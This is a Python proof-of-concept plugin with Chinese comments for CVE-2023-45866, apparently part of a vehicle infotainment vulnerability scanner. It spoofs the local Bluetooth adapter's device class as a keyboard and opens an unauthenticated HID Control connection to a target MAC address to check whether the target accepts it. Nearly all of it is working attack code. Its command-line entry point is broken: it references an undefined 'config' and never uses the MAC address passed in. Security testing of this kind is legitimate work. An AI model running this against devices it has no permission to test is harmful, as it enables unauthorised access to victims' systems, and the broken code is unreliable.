"""
PoC Name: Bluetooth Keystroke Injection
CVE: CVE-2023-45866
Component: Wireless Stack
Category: Wireless
Severity: High
CVSS: 7.5
Description: 伪造BT键盘(CoD=0x002540)进行HID注入
Prerequisites: 兼容易受控使用的Linux蓝牙适配器(如hci0)
Usage: sudo python3 43_BT_Keystroke_Injection.py <target_mac>
"""
import socket
import sys
import subprocess
import time
import os
from iv_plugin_base import IVIVulnerabilityPlugin

class BluetoothKeyboardSpoofPlugin(IVIVulnerabilityPlugin):
    """
    CVE-2023-45866 / 'Hi, My Name is Keyboard' POC
    
    原理：
    1. 修改本机蓝牙适配器 Class of Device (CoD) 为 0x002540 (Peripheral, Keyboard)。
    2. 尝试向目标蓝牙 MAC 地址的 HID Control PSM (端口 17) 发起 L2CAP 连接。
    3. 如果连接建立成功且无需我们在终端输入 PIN 码，说明目标接受了未授权的 HID 连接。
    """
    
    def __init__(self, target_config, logger=None):
        super().__init__(target_config, logger)
        self.results["cve_id"] = "CVE-2023-45866" # 或相关变种
        self.results["description"] = "Unauthenticated Bluetooth HID Injection (Keystroke Injection)"
        # 注意：这里我们期望 config 中包含 'target_mac'，如果只有 target_ip 则需要用户修改输入
        self.target_mac = target_config.get("target_mac", target_config.get("target_ip")) 
        self.hci_device = "hci0" # 默认蓝牙适配器

    def check_prerequisites(self):
        # 1. 检查是否为 Linux
        if sys.platform != "linux":
            self.logger.error("此插件仅支持 Linux 系统 (需访问 BlueZ 协议栈)。")
            return False
        
        # 2. 检查 Root 权限 (需要修改 hciconfig)
        if os.geteuid() != 0:
            self.logger.error("需 Root 权限以修改蓝牙适配器 Class of Device。请使用 sudo 运行。")
            return False

        # 3. 检查 MAC 地址格式
        if not self._is_valid_mac(self.target_mac):
            self.logger.error(f"无效的蓝牙 MAC 地址: {self.target_mac}")
            return False
            
        return True

    def _is_valid_mac(self, mac):
        if not mac: return False
        if len(mac) != 17: return False
        return all(c in '0123456789ABCDEFabcdef:' for c in mac)

    def _set_class_of_device(self, cod_hex):
        """
        使用 hciconfig 修改本机设备类型
        """
        try:
            # 关闭接口
            subprocess.run(["hciconfig", self.hci_device, "down"], check=True, stdout=subprocess.DEVNULL)
            # 修改 CoD (0x002540 = Keyboard)
            subprocess.run(["hciconfig", self.hci_device, "class", cod_hex], check=True, stdout=subprocess.DEVNULL)
            # 开启接口
            subprocess.run(["hciconfig", self.hci_device, "up"], check=True, stdout=subprocess.DEVNULL)
            self.logger.info(f"本机蓝牙 ({self.hci_device}) CoD 已伪装为: {cod_hex} (Keyboard)")
            time.sleep(1) # 等待蓝牙栈重启
            return True
        except subprocess.CalledProcessError:
            self.logger.error("无法修改蓝牙适配器配置，请检查硬件状态。")
            return False

    def exploit(self):
        self.logger.info(f"开始对蓝牙目标 {self.target_mac} 进行 Keystroke Injection 检测...")
        
        # 1. 伪装阶段：将本机设置为“键盘”
        # 0x002540: Service Class: Rendering, Audio; Major Device: Peripheral; Minor Device: Keyboard
        if not self._set_class_of_device("0x002540"):
            self.results["vulnerable"] = False
            return self.results

        # 2. 连接阶段：尝试连接 HID Control 通道 (L2CAP PSM 17)
        # 或者是 SDP (PSM 1) 来触发配对，但 HID 通道最能说明问题
        hid_control_psm = 17 
        sock = None
        
        try:
            # 创建蓝牙 L2CAP Socket
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
            
            self.logger.info(f"尝试连接目标 HID Control 通道 (PSM {hid_control_psm})...")
            # 设置超时，防止无限挂起
            sock.settimeout(5)
            
            # 尝试连接
            sock.connect((self.target_mac, hid_control_psm))
            
            # 3. 验证阶段
            # 如果 connect 成功返回，且没有抛出异常，说明 L2CAP 链路已建立。
            # 对于此漏洞，如果建立了连接且系统没有弹窗拒绝，通常意味着攻击成功。
            self.logger.warning("成功连接到 HID Control 通道！")
            
            # 尝试读取一点数据看是否立即断开
            try:
                sock.send(b"\x00") # 发送一个空指令测试链路
                self.results["vulnerable"] = True
                self.results["evidence"] = "L2CAP connection to PSM 17 accepted while spoofing Keyboard CoD."
                self.logger.warning("目标接受了来自‘键盘’的直接连接，可能存在 CVE-2023-45866 漏洞。")
            except Exception as e:
                self.logger.info(f"连接建立但发送数据失败: {e}")
                self.results["vulnerable"] = False

        except socket.error as e:
            self.logger.info(f"连接失败: {e}")
            self.results["vulnerable"] = False
            self.results["evidence"] = f"Connection refused or timed out: {e}"
            
        finally:
            if sock:
                sock.close()
            # 4. 清理阶段：恢复正常的 CoD (0x000000 或 0x000100) 以免影响本机正常使用
            self.logger.info("正在恢复本机蓝牙配置...")
            self._set_class_of_device("0x000000")

        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 43_BT_Keystroke_Injection.py <target_mac>")
        sys.exit(1)
    plugin = BluetoothKeyboardSpoofPlugin(config)
    plugin.run_verify()
